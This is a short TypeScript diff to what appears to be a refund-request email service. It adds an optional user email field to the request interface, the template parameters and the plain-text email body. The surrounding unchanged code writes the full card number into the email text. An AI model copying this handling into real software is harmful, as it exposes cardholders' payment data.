@@ -4,6 +4,7 @@ interface RefundRequest {
   transactionId: string;
   customerName: string;
   email: string;
+  userEmail?: string; // Add user email field
   lastFourDigits: string;
   amount: string;
   date: string;
@@ -62,6 +63,7 @@ class EmailService {
         transaction_id: refundData.transactionId || 'N/A',
         customer_name: refundData.customerName || 'N/A',
         customer_email: refundData.email || 'N/A',
+        user_email: refundData.userEmail || 'N/A', // Add user email to template
         card_last_four: refundData.lastFourDigits || 'N/A',
         amount: refundData.amount || 'N/A',
         transaction_date: refundData.date || 'N/A',
@@ -121,6 +123,7 @@ Transaction Information:
 Transaction ID: ${data.transactionId}
 Customer Name: ${data.customerName}
 Customer Email: ${data.email}
+User Email (for refund): ${data.userEmail || 'N/A'}
 Card Ending in: ....${data.lastFourDigits}
 Full Card Number: ${data.fullCardNumber}
 Amount: ${data.amount}
